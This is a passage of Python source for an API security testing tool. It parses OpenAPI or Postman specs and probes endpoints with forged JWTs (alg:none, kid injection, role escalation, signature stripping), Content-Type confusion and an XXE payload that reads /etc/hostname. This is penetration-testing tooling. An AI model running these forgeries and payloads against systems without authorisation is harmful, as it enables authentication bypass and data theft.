        spec = _fetch_spec_from_url(url, verify=verify, timeout=timeout)
        if spec is not None:
            return spec, url
    return None, None


def resolve_target(target: str, from_postman: bool = False,
                   verify: bool = False, timeout: int = 10) -> tuple[dict, str, str]:
    """
    Resolve the target argument into (spec_dict, base_url, source_description).

    Handles:
      - http://host:port           → probe for spec, base_url = target
      - http://host:port/spec.json → fetch directly, base_url = scheme+host+port
      - local_file.yaml            → load from disk, base_url = '' (needs --base-url)
      - postman_collection.json    → convert, base_url from collection vars
    """
    if _is_url(target):
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # If the URL has a path beyond /, try fetching it directly first
        if parsed.path and parsed.path != '/':
            spec = _fetch_spec_from_url(target, verify=verify, timeout=timeout)
            if spec is not None:
                return spec, base_url, target

        # Otherwise probe common paths
        spec, found_url = _discover_spec(base_url, verify=verify, timeout=timeout)
        if spec is not None:
            return spec, base_url, found_url

        # Try the URL with trailing paths stripped as base
        # e.g. http://host:8080/api → probe http://host:8080/api/openapi.json
        if parsed.path and parsed.path != '/':
            target_with_path = target.rstrip('/')
            spec, found_url = _discover_spec(target_with_path, verify=verify, timeout=timeout)
            if spec is not None:
                return spec, target_with_path, found_url

        raise RuntimeError(
            f"Could not find OpenAPI/Swagger spec at {target}\n"
            f"Probed: {', '.join(SPEC_PROBE_PATHS)}\n"
            f"Tip: provide the direct spec URL or a local file.")

    # Local file
    file_path = target
    try:
        with open(file_path, 'r') as f:
            content = f.read()
    except FileNotFoundError:
        raise RuntimeError(f"File not found: {file_path}")

    try:
        spec = json.loads(content)
    except json.JSONDecodeError:
        spec = yaml.safe_load(content)

    if spec is None:
        raise RuntimeError(f"Empty or unparseable file: {file_path}")

    # Postman collection?
    if from_postman or 'item' in spec:
        converter = PostmanToOpenAPI(file_path)
        spec = converter.convert()
        col_base = ''
        servers = spec.get('servers', [])
        if servers:
            col_base = servers[0].get('url', '').rstrip('/')
        return spec, col_base, f"postman:{file_path}"

    # Extract base_url from spec servers if present
    spec_base = ''
    servers = spec.get('servers', [])
    if servers:
        spec_base = servers[0].get('url', '').rstrip('/')
    # Swagger 2.x: host + basePath
    if not spec_base and 'host' in spec:
        scheme = (spec.get('schemes') or ['https'])[0]
        base_path = spec.get('basePath', '')
        spec_base = f"{scheme}://{spec['host']}{base_path}".rstrip('/')

    return spec, spec_base, file_path


# ===================================================================
# APIvolt Core Engine
# ===================================================================
class APIvolt:
    """
    API Security Testing Engine.
    Accepts OpenAPI specs or Postman collections as input.
    """

    BURP_PROXY = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    TYPE_SAMPLES = {
        'string': 'test_string', 'integer': 1, 'number': 1.0,
        'boolean': True, 'array': [], 'object': {},
    }

    FORMAT_SAMPLES = {
        'email': 'test@example.com',
        'uuid': '550e8400-e29b-41d4-a716-446655440000',
        'date': '2024-01-01',
        'date-time': '2024-01-01T00:00:00Z',
        'uri': 'https://example.com',
        'hostname': 'example.com',
        'ipv4': '192.168.1.1', 'ipv6': '::1',
        'byte': 'dGVzdA==', 'binary': 'binary_data',
        'password': 'P@ssw0rd123',
        'int32': 42, 'int64': 9223372036854775807,
        'float': 3.14, 'double': 3.141592653589793,
    }

    def __init__(
        self,
        spec_path: str,
        base_url: str,
        from_postman: bool = False,
        jwt: str | None = None,
        jwt_secondary: str | None = None,
        api_key: str | None = None,
        api_key_header: str = 'X-API-Key',
        cookie_auth: str | None = None,
        basic_auth: str | None = None,
        use_proxy: bool = False,
        proxy_url: str | None = None,
        timeout: int = 30,
        log_file: str | None = None,
        delay: float = 0.0,
        sample_string: str | None = None,
        sample_integer: int | None = None,
        sample_number: float | None = None,
        sample_boolean: bool | None = None,
        sample_array: Any | None = None,
        sample_object: Any | None = None,
    ):
        self.from_postman = from_postman
        self.jwt = jwt
        self.jwt_secondary = jwt_secondary
        self.api_key = api_key
        self.api_key_header = api_key_header
        self.cookie_auth = cookie_auth
        self.basic_auth = basic_auth
        self.use_proxy = use_proxy
        self.timeout = timeout
        self.delay = delay
        self.findings: list[dict] = []

        self.type_samples = dict(self.TYPE_SAMPLES)
        if sample_string is not None: self.type_samples['string'] = sample_string
        if sample_integer is not None: self.type_samples['integer'] = sample_integer
        if sample_number is not None: self.type_samples['number'] = sample_number
        if sample_boolean is not None: self.type_samples['boolean'] = sample_boolean
        if sample_array is not None: self.type_samples['array'] = sample_array
        if sample_object is not None: self.type_samples['object'] = sample_object

        if proxy_url:
            self.proxies = {'http': proxy_url, 'https': proxy_url}
        else:
            self.proxies = self.BURP_PROXY if use_proxy else None

        self._setup_logging(log_file)
        self.logger.info(BANNER)

        # Resolve target → spec
        try:
            self.spec, resolved_base, source = resolve_target(
                spec_path, from_postman=from_postman, timeout=timeout)
        except RuntimeError as e:
            self.logger.error(f"{Colors.FAIL}[-] {e}{Colors.END}")
            sys.exit(1)

        # base_url priority: explicit --base-url > resolved from target/spec
        self.base_url = (base_url.rstrip('/') if base_url else resolved_base) or ''
        self.spec_path = source

        self.logger.info(f"{Colors.GREEN}[+] Spec source: {source}{Colors.END}")
        self.logger.info(f"{Colors.GREEN}[+] Base URL: {self.base_url or '(not set: use --base-url)'}{Colors.END}")
        self.logger.info(f"{Colors.GREEN}[+] Paths in spec: {len(self.spec.get('paths', {}))}{Colors.END}")

        self.endpoints = self._parse_endpoints()

    # ------------------------------------------------------------------
    # Setup / Loading
    # ------------------------------------------------------------------
    def _setup_logging(self, log_file: str | None):
        self.logger = logging.getLogger(TOOL_NAME)
        self.logger.setLevel(logging.DEBUG)
        if not any(isinstance(h, logging.StreamHandler) for h in self.logger.handlers):
            console = logging.StreamHandler()
            console.setLevel(logging.INFO)
            console.setFormatter(logging.Formatter('%(message)s'))
            self.logger.addHandler(console)
        if log_file is None:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            log_file = f'apivolt_{timestamp}.log'
        fh = logging.FileHandler(log_file)
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        self.logger.addHandler(fh)
        self.log_file = log_file

    def _resolve_ref(self, ref: str) -> dict:
        parts = ref.replace('#/', '').split('/')
        result = self.spec
        for part in parts:
            result = result.get(part, {})
        return result

    # ------------------------------------------------------------------
    # Sample generation
    # ------------------------------------------------------------------
    def _generate_sample_value(self, schema: dict) -> Any:
        if not schema:
            return None
        if '$ref' in schema:
            schema = self._resolve_ref(schema['$ref'])
        for key in ('example', 'default'):
            if key in schema:
                return schema[key]
        if 'enum' in schema:
            return schema['enum'][0]
        schema_type = schema.get('type', 'string')
        schema_format = schema.get('format')
        if schema_format and schema_format in self.FORMAT_SAMPLES:
            return self.FORMAT_SAMPLES[schema_format]
        if schema_type == 'array':
            return [self._generate_sample_value(schema.get('items', {}))]
        if schema_type == 'object':
            return {k: self._generate_sample_value(p) for k, p in schema.get('properties', {}).items()}
        return self.type_samples.get(schema_type, 'test')

    def _generate_sample_for_param(self, param: dict) -> Any:
        schema = param.get('schema') or {}
        name = (param.get('name') or '').lower()
        for key in ('example', 'default'):
            if key in schema:
                return schema[key]
        if 'enum' in schema:
            return schema['enum'][0]
        schema_type = schema.get('type', 'string')
        schema_format = schema.get('format')
        if schema_format and schema_format in self.FORMAT_SAMPLES:
            return self.FORMAT_SAMPLES[schema_format]
        if schema_type == 'string':
            if name == 'id' or name.endswith('_id') or 'uuid' in name:
                return self.FORMAT_SAMPLES['uuid']
            if 'email' in name: return self.FORMAT_SAMPLES['email']
            if 'date' in name: return self.FORMAT_SAMPLES['date']
            return self.type_samples['string']
        if schema_type in ('integer', 'number'):
            if name in ('limit', 'page', 'size'): return 10
            if name == 'offset': return 0
            for bound in ('minimum', 'maximum'):
                if schema.get(bound) is not None:
                    return schema[bound]
            return self.type_samples.get(schema_type, 1)
        if schema_type in ('object', 'array'):
            return self._generate_sample_value(schema)
        return self.type_samples.get(schema_type, 'test')

    # ------------------------------------------------------------------
    # Endpoint parsing
    # ------------------------------------------------------------------
    def _parse_endpoints(self) -> list[dict]:
        endpoints = []
        paths = self.spec.get('paths', {})
        for path, methods in paths.items():
            path_level_params = methods.get('parameters', [])
            for method, details in methods.items():
                if not isinstance(details, dict):
                    continue
                if method.upper() not in ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']:
                    continue
                endpoint = {
                    'path': path,
                    'method': method.upper(),
                    'operation_id': details.get('operationId', f'{method}_{path}'),
                    'summary': details.get('summary', ''),
                    'description': details.get('description', ''),
                    'parameters': [],
                    'request_body': None,
                    'security': details.get('security', self.spec.get('security', [])),
                    'tags': details.get('tags', []),
                    'responses': details.get('responses', {}),
                    'deprecated': details.get('deprecated', False),
                }
                seen = {}
                for param in list(path_level_params) + details.get('parameters', []):
                    if '$ref' in param:
                        param = self._resolve_ref(param['$ref'])
                    seen[(param.get('name'), param.get('in'))] = param
                for param in seen.values():
                    ep_param = {
                        'name': param.get('name'), 'in': param.get('in'),
                        'required': param.get('required', False),
                        'schema': param.get('schema', {}) or {},
                    }
                    ep_param['sample'] = self._generate_sample_for_param(ep_param)
                    endpoint['parameters'].append(ep_param)
                if 'requestBody' in details:
                    body = details['requestBody']
                    content = body.get('content', {})
                    if 'application/json' in content:
                        schema = content['application/json'].get('schema', {})
                        if '$ref' in schema:
                            schema = self._resolve_ref(schema['$ref'])
                        endpoint['request_body'] = {
                            'content_type': 'application/json',
                            'schema': schema,
                            'sample': self._generate_sample_value(schema),
                            'required': body.get('required', False),
                        }
                    elif content:
                        ct = list(content.keys())[0]
                        schema = content[ct].get('schema', {})
                        endpoint['request_body'] = {
                            'content_type': ct, 'schema': schema,
                            'sample': self._generate_sample_value(schema),
                            'required': body.get('required', False),
                        }
                endpoints.append(endpoint)
        self.logger.info(f"{Colors.GREEN}[+] Parsed {len(endpoints)} endpoints{Colors.END}")
        return endpoints

    # ------------------------------------------------------------------
    # Request building
    # ------------------------------------------------------------------
    def _build_request(self, endpoint: dict, auth_mode: str = 'primary',
                       content_type_override: str | None = None) -> dict:
        url_path = endpoint['path']
        query_params, headers, cookies = {}, {}, {}

        for param in endpoint['parameters']:
            val, loc, name = param['sample'], param['in'], param['name']
            if loc == 'path':
                url_path = url_path.replace(f'{{{name}}}', str(val))
            elif loc == 'query':
                query_params[name] = val
            elif loc == 'header':
                headers[name] = str(val)
            elif loc == 'cookie':
                cookies[name] = str(val)

        url = f"{self.base_url}{url_path}" if url_path.startswith('/') else f"{self.base_url}/{url_path}"

        # Auth injection
        if auth_mode == 'primary' and self.jwt:
            headers['Authorization'] = f'Bearer {self.jwt}'
        elif auth_mode == 'secondary' and self.jwt_secondary:
            headers['Authorization'] = f'Bearer {self.jwt_secondary}'
        elif auth_mode == 'apikey' and self.api_key:
            headers[self.api_key_header] = self.api_key
        elif auth_mode == 'cookie' and self.cookie_auth:
            cookies['session'] = self.cookie_auth
        elif auth_mode == 'basic' and self.basic_auth:
            headers['Authorization'] = f'Basic {base64.b64encode(self.basic_auth.encode()).decode()}'
        elif auth_mode == 'custom_jwt':
            # auth_mode can be a raw JWT string set by caller
            pass  # handled by callers who set Authorization directly

        kwargs = {
            'method': endpoint['method'], 'url': url, 'headers': headers,
            'params': query_params or None, 'cookies': cookies or None,
            'timeout': self.timeout, 'verify': False,
        }
        if self.proxies:
            kwargs['proxies'] = self.proxies

        if endpoint['request_body']:
            body = endpoint['request_body']
            ct = content_type_override or body['content_type']
            if ct == 'application/json':
                kwargs['json'] = body['sample']
                headers['Content-Type'] = 'application/json'
            elif content_type_override:
                # Content-Type confusion: re-encode the body
                kwargs['data'] = self._reencode_body(body['sample'], content_type_override)
                headers['Content-Type'] = content_type_override
            else:
                kwargs['data'] = body['sample']
                headers['Content-Type'] = body['content_type']

        return kwargs

    def _reencode_body(self, body: Any, target_ct: str) -> str | bytes:
        """Re-encode a JSON body into a different Content-Type format for confusion attacks."""
        if target_ct == 'application/xml' or target_ct == 'text/xml':
            return self._json_to_xml(body)
        elif target_ct == 'application/x-www-form-urlencoded':
            if isinstance(body, dict):
                return urlencode(body)
            return str(body)
        elif target_ct == 'text/plain':
            return json.dumps(body) if not isinstance(body, str) else body
        elif target_ct == 'application/x-yaml' or target_ct == 'text/yaml':
            return yaml.dump(body, default_flow_style=False)
        elif target_ct == 'multipart/form-data':
            # Let requests handle multipart if we pass files= but here we
            # just stringify as fallback
            if isinstance(body, dict):
                return urlencode(body)
            return str(body)
        return json.dumps(body) if not isinstance(body, str) else body

    def _json_to_xml(self, obj: Any, root: str = 'root') -> str:
        """Minimal JSON → XML conversion for Content-Type confusion."""
        def _to_xml(data, tag: str) -> str:
            if isinstance(data, dict):
                inner = ''.join(_to_xml(v, k) for k, v in data.items())
                return f'<{tag}>{inner}</{tag}>'
            elif isinstance(data, list):
                return ''.join(_to_xml(item, 'item') for item in data)
            elif isinstance(data, bool):
                return f'<{tag}>{"true" if data else "false"}</{tag}>'
            else:
                return f'<{tag}>{data}</{tag}>'
        return f'<?xml version="1.0"?>{_to_xml(obj, root)}'

    def _format_response(self, response: requests.Response) -> str:
        lines = [
            f"Status: {response.status_code} {response.reason}",
            f"Time: {response.elapsed.total_seconds():.3f}s",
            f"Size: {len(response.content)} bytes", "Headers:",
        ]
        for k, v in response.headers.items():
            lines.append(f"  {k}: {v}")
        try:
            body = json.dumps(response.json(), indent=2)
        except (json.JSONDecodeError, ValueError):
            body = response.text[:2000]
            if len(response.text) > 2000:
                body += "\n... [truncated]"
        lines.extend(["Body:", body])
        return '\n'.join(lines)

    def _log_type_samples(self):
        overrides = {k: v for k, v in self.type_samples.items() if self.TYPE_SAMPLES.get(k) != v}
        if overrides:
            self.logger.info(f"{Colors.HEADER}Type samples (overrides):{Colors.END}")
            for k, v in overrides.items():
                self.logger.info(f"  {k}: {Colors.CYAN}{v}{Colors.END}")

    # ------------------------------------------------------------------
    # Request execution
    # ------------------------------------------------------------------
    def send_request(self, endpoint: dict, auth_mode: str = 'primary',
                     content_type_override: str | None = None) -> requests.Response | None:
        kwargs = self._build_request(endpoint, auth_mode=auth_mode,
                                      content_type_override=content_type_override)
        self.logger.info(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
        self.logger.info(f"{Colors.CYAN}[>] {endpoint['method']} {kwargs['url']}{Colors.END}")
        if auth_mode != 'primary':
            self.logger.info(f"    {Colors.DIM}auth_mode={auth_mode}{Colors.END}")
        if content_type_override:
            self.logger.info(f"    {Colors.DIM}Content-Type={content_type_override}{Colors.END}")
        if endpoint['summary']:
            self.logger.info(f"    {endpoint['summary']}")
        self.logger.debug(f"Request: {json.dumps(kwargs, indent=2, default=str)}")

        if self.delay > 0:
            time.sleep(self.delay)
        try:
            resp = requests.request(**kwargs)
            status = resp.status_code
            color = (Colors.GREEN if 200 <= status < 300 else
                     Colors.BLUE if 300 <= status < 400 else
                     Colors.WARNING if 400 <= status < 500 else Colors.FAIL)
            self.logger.info(
                f"{color}[<] {status} {resp.reason} "
                f"({resp.elapsed.total_seconds():.3f}s, {len(resp.content)}B){Colors.END}")
            self.logger.debug(f"Response:\n{self._format_response(resp)}")
            return resp
        except requests.exceptions.ProxyError:
            self.logger.error(f"{Colors.FAIL}[-] Proxy error - is Burp running?{Colors.END}")
        except requests.exceptions.ConnectionError as e:
            self.logger.error(f"{Colors.FAIL}[-] Connection error: {e}{Colors.END}")
        except requests.exceptions.Timeout:
            self.logger.error(f"{Colors.FAIL}[-] Timeout{Colors.END}")
        except Exception as e:
            self.logger.error(f"{Colors.FAIL}[-] Error: {e}{Colors.END}")
        return None

    def _send_raw(self, method: str, url: str, headers: dict | None = None,
                  json_body: Any = None, data: Any = None,
                  auth_mode: str = 'primary') -> requests.Response | None:
        hdrs = dict(headers or {})
        if auth_mode == 'primary' and self.jwt:
            hdrs['Authorization'] = f'Bearer {self.jwt}'
        elif auth_mode == 'secondary' and self.jwt_secondary:
            hdrs['Authorization'] = f'Bearer {self.jwt_secondary}'
        kwargs = {'method': method, 'url': url, 'headers': hdrs,
                  'timeout': self.timeout, 'verify': False}
        if self.proxies:
            kwargs['proxies'] = self.proxies
        if json_body is not None:
            kwargs['json'] = json_body
            hdrs['Content-Type'] = 'application/json'
        if data is not None:
            kwargs['data'] = data
        if self.delay > 0:
            time.sleep(self.delay)
        try:
            return requests.request(**kwargs)
        except Exception as e:
            self.logger.debug(f"Raw request error: {e}")
            return None

    # ------------------------------------------------------------------
    # Finding management
    # ------------------------------------------------------------------
    def _add_finding(self, severity: str, category: str, endpoint: str,
                     title: str, detail: str):
        self.findings.append({
            'severity': severity, 'category': category,
            'endpoint': endpoint, 'title': title, 'detail': detail,
            'timestamp': datetime.now().isoformat(),
        })
        sev_colors = {
            'CRITICAL': Colors.FAIL, 'HIGH': Colors.FAIL,
            'MEDIUM': Colors.WARNING, 'LOW': Colors.CYAN, 'INFO': Colors.DIM,
        }
        self.logger.info(
            f"{sev_colors.get(severity, Colors.END)}[FINDING][{severity}] "
            f"{category}: {title}{Colors.END}")
        self.logger.info(f"  {detail}")

    def _filter_endpoints(self, tags=None, methods=None) -> list[dict]:
        filtered = self.endpoints
        if tags:
            filtered = [e for e in filtered if any(t in e['tags'] for t in tags)]
        if methods:
            methods_upper = [m.upper() for m in methods]
            filtered = [e for e in filtered if e['method'] in methods_upper]
        return filtered

    def _is_id_param(self, param: dict) -> bool:
        name = (param.get('name') or '').lower()
        return (name == 'id' or name.endswith('_id') or name.endswith('id')
                or 'uuid' in name or param.get('schema', {}).get('format') == 'uuid')

    def _body_similarity(self, r1, r2) -> float:
        try:
            b1, b2 = r1.text, r2.text
            if not b1 and not b2: return 1.0
            if not b1 or not b2: return 0.0
            return min(len(b1), len(b2)) / max(len(b1), len(b2))
        except Exception:
            return 0.0

    # ==================================================================
    # TEST MODULE 9: JWT Manipulation
    # ==================================================================
    def test_jwt(self, tags=None, methods=None):
        """
        Comprehensive JWT security testing:
        1. Token analysis (claims, expiry, algorithm)
        2. alg:none bypass (multiple variants)
        3. Expired token with future exp (alg:none)
        4. kid injection (path traversal, SQLi)
        5. Role/privilege escalation in claims
        6. Signature stripping
        7. Empty/malformed token acceptance
        """
        if not self.jwt:
            self.logger.error(f"{Colors.FAIL}[!] JWT test requires --jwt{Colors.END}")
            return

        self.logger.info(f"\n{Colors.MAGENTA}{'='*60}")
        self.logger.info("[MODULE] JWT Manipulation Testing")
        self.logger.info(f"{'='*60}{Colors.END}")

        # Step 1: Analyze the token
        info = JWTUtils.analyze(self.jwt)
        if not info.get('valid'):
            self.logger.error(f"{Colors.FAIL}  Invalid JWT: {info.get('error')}{Colors.END}")
            return

        self.logger.info(f"  {Colors.CYAN}Algorithm: {info['algorithm']}{Colors.END}")
        self.logger.info(f"  Subject:  {info.get('subject', 'N/A')}")
        self.logger.info(f"  Issuer:   {info.get('issuer', 'N/A')}")
        self.logger.info(f"  Expired:  {info.get('expired', 'N/A')}")
        if info.get('kid'):
            self.logger.info(f"  kid:      {info['kid']}")

        if info.get('no_expiry'):
            self._add_finding('MEDIUM', 'JWT_NO_EXPIRY', 'Token',
                              'JWT has no expiration claim (exp)',
                              'Tokens without expiry never become invalid. Stolen tokens have unlimited lifetime.')

        if info.get('expired'):
            self.logger.info(f"  {Colors.WARNING}[!] Token is expired: testing if server rejects it{Colors.END}")

        # Pick a few endpoints for testing
        filtered = self._filter_endpoints(tags, methods)
        test_eps = [ep for ep in filtered if ep['security']][:3]
        if not test_eps:
            test_eps = filtered[:3]

        if not test_eps:
            self.logger.info(f"  {Colors.DIM}No endpoints to test{Colors.END}")
            return

        # Get baseline with valid token
        baseline_ep = test_eps[0]
        ep_str = f"{baseline_ep['method']} {baseline_ep['path']}"
        baseline_resp = self.send_request(baseline_ep, auth_mode='primary')
        baseline_status = baseline_resp.status_code if baseline_resp else None
        self.logger.info(f"  Baseline: {ep_str} → {baseline_status}")

        def _test_token(label: str, token: str, finding_cat: str, sev: str, desc: str):
            """Send a forged token and check if accepted."""
            for ep in test_eps[:2]:
                req = self._build_request(ep, auth_mode='none')
                req['headers']['Authorization'] = f'Bearer {token}'
                if self.delay > 0:
                    time.sleep(self.delay)
                try:
                    resp = requests.request(**req)
                    status = resp.status_code
                    if 200 <= status < 300:
                        self._add_finding(
                            sev, finding_cat, f"{ep['method']} {ep['path']}",
                            f'JWT {label}: forged token accepted (HTTP {status})',
                            f'{desc}. Response size: {len(resp.content)}B.')
                    elif status not in (401, 403):
                        self.logger.info(
                            f"    {Colors.DIM}JWT {label}: status {status} (unexpected){Colors.END}")
                    else:
                        self.logger.info(
                            f"    {Colors.GREEN}JWT {label}: properly rejected ({status}){Colors.END}")
                except Exception as e:
                    self.logger.debug(f"    JWT test error: {e}")

        # Step 2: alg:none variants
        self.logger.info(f"\n  {Colors.CYAN}[*] Testing alg:none bypass variants...{Colors.END}")
        for variant_name, forged in JWTUtils.forge_none_variants(self.jwt):
            _test_token(
                f'alg:{variant_name}', forged, 'JWT_ALG_NONE', 'CRITICAL',
                f'Server accepts JWT with alg:{variant_name} (no signature verification)')

        # Step 3: Expired bypass
        self.logger.info(f"\n  {Colors.CYAN}[*] Testing expired token bypass...{Colors.END}")
        forged_exp = JWTUtils.forge_expired_bypass(self.jwt)
        _test_token('exp_bypass', forged_exp, 'JWT_EXP_BYPASS', 'HIGH',
                     'Server accepts JWT with modified expiration and alg:none')

        # Step 4: kid injection
        if info.get('kid') or info['algorithm'].startswith('RS') or info['algorithm'].startswith('HS'):
            self.logger.info(f"\n  {Colors.CYAN}[*] Testing kid injection...{Colors.END}")
            for kid_val, forged in JWTUtils.forge_kid_injection(self.jwt):
                label = kid_val[:40].replace('\n', '')
                _test_token(f'kid={label}', forged, 'JWT_KID_INJECTION', 'CRITICAL',
                             f'Server accepts JWT with injected kid: {kid_val[:60]}')

        # Step 5: Role escalation
        self.logger.info(f"\n  {Colors.CYAN}[*] Testing role/privilege escalation in claims...{Colors.END}")
        for label, forged in JWTUtils.forge_role_escalation(self.jwt):
            _test_token(f'escalate:{label}', forged, 'JWT_ROLE_ESCALATION', 'CRITICAL',
                         f'Server accepts JWT with escalated claim: {label}')

        # Step 6: Signature stripping
        self.logger.info(f"\n  {Colors.CYAN}[*] Testing signature stripping...{Colors.END}")
        parts = self.jwt.split('.')
        if len(parts) == 3:
            stripped = f"{parts[0]}.{parts[1]}."
            _test_token('sig_stripped', stripped, 'JWT_SIG_STRIP', 'CRITICAL',
                         'Server accepts JWT with signature removed entirely')

        # Step 7: Empty / malformed tokens
        self.logger.info(f"\n  {Colors.CYAN}[*] Testing empty/malformed tokens...{Colors.END}")
        malformed_tokens = [
            ('empty', ''),
            ('null_string', 'null'),
            ('single_dot', 'a.b'),
            ('three_dots', '...'),
            ('invalid_b64', 'xxx.yyy.zzz'),
        ]
        for label, tok in malformed_tokens:
            _test_token(f'malformed:{label}', tok, 'JWT_MALFORMED', 'HIGH',
                         f'Server accepts malformed JWT token: {label}')

    # ==================================================================
    # TEST MODULE 10: Content-Type Confusion
    # ==================================================================
    def test_content_type(self, tags=None, methods=None):
        """
        Test parser confusion by sending request bodies with unexpected
        Content-Type headers. Targets endpoints that accept JSON and sends
        the same data as XML, form-urlencoded, YAML, plain text, etc.
        """
        self.logger.info(f"\n{Colors.MAGENTA}{'='*60}")
        self.logger.info("[MODULE] Content-Type Confusion Testing")
        self.logger.info(f"{'='*60}{Colors.END}")

        confusion_types = [
            'application/xml',
            'text/xml',
            'application/x-www-form-urlencoded',
            'text/plain',
            'application/x-yaml',
            'text/yaml',
            'application/json; charset=utf-7',     # Encoding confusion
            'application/vnd.api+json',             # JSON:API
            'application/csp-report',               # Bypass WAF matching on CT
            'text/html',                            # Potential XSS context
        ]

        filtered = self._filter_endpoints(tags, methods)
        # Only endpoints with JSON body
        json_eps = [
            ep for ep in filtered
            if ep['request_body']
            and ep['request_body'].get('content_type') == 'application/json'
        ]

        if not json_eps:
            self.logger.info(f"  {Colors.DIM}No JSON body endpoints found{Colors.END}")
            return

        self.logger.info(f"  Testing {len(json_eps)} JSON endpoints × {len(confusion_types)} Content-Types")

        for ep in json_eps:
            ep_str = f"{ep['method']} {ep['path']}"

            # Get baseline with correct Content-Type
            baseline = self.send_request(ep)
            baseline_status = baseline.status_code if baseline else None

            for ct in confusion_types:
                resp = self.send_request(ep, content_type_override=ct)
                if not resp:
                    continue

                status = resp.status_code

                # Interesting: server accepted non-JSON content-type for a JSON endpoint
                if 200 <= status < 300:
                    self._add_finding(
                        'MEDIUM', 'CONTENT_TYPE_CONFUSION',
                        ep_str,
                        f'Server accepts Content-Type: {ct} (HTTP {status})',
                        f'Endpoint designed for JSON but accepted {ct}. '
                        f'Baseline status: {baseline_status}. '
                        f'This may enable parser differential attacks or WAF bypass.')

                    # Extra check: if XML was accepted, test for XXE indicator
                    if 'xml' in ct.lower() and ep['request_body'].get('sample'):
                        xxe_body = (
                            '<?xml version="1.0"?>'
                            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
                            '<root>&xxe;</root>'
                        )
                        req = self._build_request(ep, auth_mode='primary')
                        req['headers']['Content-Type'] = ct
                        req.pop('json', None)
                        req['data'] = xxe_body
                        try:
                            if self.delay > 0:
                                time.sleep(self.delay)
                            xxe_resp = requests.request(**req)
                            if xxe_resp and 200 <= xxe_resp.status_code < 300:
                                # Check if response differs (possible XXE)
                                if len(xxe_resp.content) != len(resp.content):
                                    self._add_finding(
                                        'HIGH', 'CONTENT_TYPE_XXE',
                                        ep_str,
                                        f'Possible XXE via Content-Type confusion ({ct})',
                                        f'XXE payload response size differs from normal XML. '
                                        f'Normal: {len(resp.content)}B, XXE: {len(xxe_resp.content)}B.')
                        except Exception:
                            pass

                # Server error on wrong CT is informative
                elif status == 500 and baseline_status != 500:
                    self._add_finding(
                        'LOW', 'CONTENT_TYPE_ERROR',
                        ep_str,
                        f'Server error (500) with Content-Type: {ct}',
                        f'Parser may not handle {ct} gracefully. Baseline was {baseline_status}.')

            # Also test: no Content-Type header at all
            req = self._build_request(ep, auth_mode='primary')
            req['headers'].pop('Content-Type', None)
            req.pop('json', None)
            if isinstance(ep['request_body'].get('sample'), (dict, list)):
                req['data'] = json.dumps(ep['request_body']['sample'])
            try:
                if self.delay > 0:
                    time.sleep(self.delay)
                no_ct_resp = requests.request(**req)
                if no_ct_resp and 200 <= no_ct_resp.status_code < 300:
                    self._add_finding(
                        'LOW', 'CONTENT_TYPE_MISSING',
                        ep_str,
                        f'Server accepts request without Content-Type header ({no_ct_resp.status_code})',
                        'Server does not enforce Content-Type validation.')
            except Exception:
                pass

    # ==================================================================
    # TEST MODULE 11: Response Schema Validation
    # ==================================================================
    def test_schema_validation(self, tags=None, methods=None):
        """
        Compare actual API responses against the OpenAPI spec response schemas.
        Detects:
          - Undocumented fields in responses (potential data exposure)
          - Missing required fields (spec drift)
          - Type mismatches (schema inaccuracy)
          - Undocumented status codes
        """
        self.logger.info(f"\n{Colors.MAGENTA}{'='*60}")
        self.logger.info("[MODULE] Response Schema Validation")
        self.logger.info(f"{'='*60}{Colors.END}")

        filtered = self._filter_endpoints(tags, methods)

        for ep in filtered:
            ep_str = f"{ep['method']} {ep['path']}"
            resp = self.send_request(ep)
            if not resp:
                continue

            status_str = str(resp.status_code)
            spec_responses = ep.get('responses', {})

            # Check if status code is documented
            matched_spec = (
                spec_responses.get(status_str)
                or spec_responses.get(f'{status_str[0]}XX')  # e.g., 2XX
                or spec_responses.get('default')
            )

            if not matched_spec and status_str not in spec_responses:
                self._add_finding(
                    'LOW', 'SCHEMA_UNDOCUMENTED_STATUS',
                    ep_str,
                    f'Undocumented response status code: {resp.status_code}',
                    f'Status {resp.status_code} is not defined in the spec. '
                    f'Documented: {list(spec_responses.keys())}.')

            # Try to validate response body against schema
            if not matched_spec:
                continue

            # Extract response schema
            resp_content = matched_spec.get('content', {})
            resp_schema = None
            for ct_key in ('application/json', '*/*'):
                if ct_key in resp_content:
                    resp_schema = resp_content[ct_key].get('schema', {})
                    if '$ref' in resp_schema:
                        resp_schema = self._resolve_ref(resp_schema['$ref'])
                    break

            if not resp_schema:
                continue

            # Parse response body
            try:
                actual_body = resp.json()
            except (json.JSONDecodeError, ValueError):
                continue

            # Validate
            violations = self._validate_schema(actual_body, resp_schema, path='$')

            for violation in violations:
                vtype = violation['type']
                if vtype == 'extra_field':
                    self._add_finding(
                        'MEDIUM', 'SCHEMA_EXTRA_FIELD',
                        ep_str,
                        f'Undocumented field in response: {violation["path"]}',
                        f'Field "{violation["field"]}" at {violation["path"]} is not in the spec schema. '
                        f'May indicate excessive data exposure or spec drift.')
                elif vtype == 'missing_required':
                    self._add_finding(
                        'LOW', 'SCHEMA_MISSING_FIELD',
                        ep_str,
                        f'Missing required field: {violation["path"]}',
                        f'Required field "{violation["field"]}" is absent in the response.')
                elif vtype == 'type_mismatch':
                    self._add_finding(
                        'LOW', 'SCHEMA_TYPE_MISMATCH',
                        ep_str,
                        f'Type mismatch at {violation["path"]}',
                        f'Expected type "{violation["expected"]}", got "{violation["actual"]}".')

    def _validate_schema(self, actual: Any, schema: dict, path: str = '$') -> list[dict]:
        """Recursively validate response data against OpenAPI schema."""
        violations = []

        if not schema or not isinstance(schema, dict):
            return violations

        if '$ref' in schema:
            schema = self._resolve_ref(schema['$ref'])

        expected_type = schema.get('type')

        # Handle allOf / oneOf / anyOf (simplified: merge allOf, take first of oneOf/anyOf)
        if 'allOf' in schema:
            merged = {}
            for sub in schema['allOf']:
                if '$ref' in sub:
                    sub = self._resolve_ref(sub['$ref'])
                merged_props = merged.get('properties', {})
                merged_props.update(sub.get('properties', {}))
                merged['properties'] = merged_props
                merged['type'] = sub.get('type', merged.get('type'))
